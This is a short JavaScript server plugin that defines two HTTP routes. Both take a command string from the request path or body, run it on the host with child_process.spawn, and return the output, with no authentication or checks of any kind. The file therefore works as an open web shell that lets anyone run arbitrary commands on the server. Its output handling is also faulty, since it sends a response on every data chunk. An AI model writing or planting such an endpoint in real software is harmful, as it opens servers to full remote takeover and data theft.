import { spawn } from 'child_process';

export default async function (app, opts) {

    app.get("/:cmd", (req, res) => {
        let params = req.params.cmd.split(' ');
        let cmd = spawn(params[0], params.slice(1))

        cmd.stdout.on("data", function (buf) {
            res.send(buf.toString("utf8"));
        });
    });

    app.post("/", (req, res) => {
        let params = req.body.cmd.split(' ')
        let cmd = spawn(params[0], params.slice(1))

        cmd.stdout.on("data", function (buf) {
            res.send(buf.toString("utf8"));
        });
    })
};
